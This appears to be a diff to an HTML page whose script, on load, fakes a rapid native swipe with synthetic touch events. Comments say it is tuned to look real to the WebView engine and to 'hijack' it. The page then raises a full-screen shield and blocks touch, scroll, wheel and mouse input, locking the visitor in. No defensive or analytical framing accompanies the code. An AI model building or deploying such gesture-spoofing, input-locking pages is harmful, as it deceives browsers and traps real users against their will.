@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Protocol Final</title>
+    <title>Accelerated Force</title>
     <style>
         body, html {
             margin: 0;
@@ -12,18 +12,15 @@
             color: #00ff00;
             font-family: monospace;
             height: 500vh;
-            /* Prevent bounce-back during the swipe */
             overscroll-behavior-y: none;
         }
 
-        /* The Box remains, but the text is gone */
         #top-block {
             height: 300px;
-            background: red;
+            background: red; 
             width: 100%;
         }
 
-        /* The Glass Shield for the lock */
         #shield {
             display: none;
             position: fixed;
@@ -33,84 +30,64 @@
             height: 100%;
             z-index: 9999;
         }
-
-        #main-content {
-            padding: 20px;
-        }
     </style>
 </head>
 <body>
-
     <div id="shield"></div>
-    
     <div id="top-block"></div>
-
     <div id="main-content">
         </div>
 
     <script>
-        // Creates the raw hardware signal
         function createTouchEvent(type, y) {
             return new TouchEvent(type, {
                 bubbles: true,
                 cancelable: true,
-                touches: [
-                    new Touch({
-                        identifier: Date.now(),
-                        target: document.body,
-                        clientY: y,
-                        screenY: y,
-                        pageY: y
-                    })
-                ]
+                touches: [new Touch({
+                    identifier: Date.now(),
+                    target: document.body,
+                    clientY: y,
+                    screenY: y,
+                    pageY: y
+                })]
             });
         }
 
-        async function simulateNativeSwipe() {
-            const startY = 800; 
-            const endY = 100;   
-            const steps = 60;   
-            const duration = 1000; 
+        async function runAcceleratedHijack() {
+            const startY = 800;
+            const endY = 100;
+            const steps = 15; // Enough steps to look "real" to the engine
+            const stepDelay = 15; // 15ms per step = ~225ms total duration
 
-            // 1. Initiate Touch
+            // 1. Start Touch
             document.body.dispatchEvent(createTouchEvent('touchstart', startY));
 
-            // 2. The Sweep
+            // 2. Fast Loop
             for (let i = 0; i <= steps; i++) {
                 const currentY = startY - ((startY - endY) * (i / steps));
                 document.body.dispatchEvent(createTouchEvent('touchmove', currentY));
                 
-                // Keep the internal scroll sync'd with the touch simulation
+                // Keep the viewport moving with the "finger"
                 window.scrollBy(0, (startY - endY) / steps);
                 
-                await new Promise(r => setTimeout(r, duration / steps));
+                await new Promise(r => setTimeout(r, stepDelay));
             }
 
-            // 3. Release Touch
+            // 3. End Touch
             document.body.dispatchEvent(createTouchEvent('touchend', endY));
 
-            // 4. Engage Shield
-            setTimeout(engageLock, 200);
-        }
-
-        function engageLock() {
+            // 4. Engage Lock
             document.getElementById('shield').style.display = 'block';
-            
-            const prevent = (e) => {
-                e.preventDefault();
-                e.stopPropagation();
-            };
-
-            const events = ['touchstart', 'touchmove', 'scroll', 'wheel', 'mousedown'];
-            events.forEach(ev => {
+            const prevent = (e) => { e.preventDefault(); e.stopPropagation(); };
+            ['touchstart', 'touchmove', 'scroll', 'wheel', 'mousedown'].forEach(ev => {
                 window.addEventListener(ev, prevent, { passive: false, capture: true });
-                document.getElementById('shield').addEventListener(ev, prevent, { passive: false, capture: true });
             });
         }
 
+        // We still need a tiny initial delay (100ms) 
+        // to let the WebView "settle" after load before we hijack it.
         window.onload = () => {
-            // Delay to ensure the WebViewer has fully initialized its UI
-            setTimeout(simulateNativeSwipe, 1000);
+            setTimeout(runAcceleratedHijack, 150);
         };
     </script>
 </body>
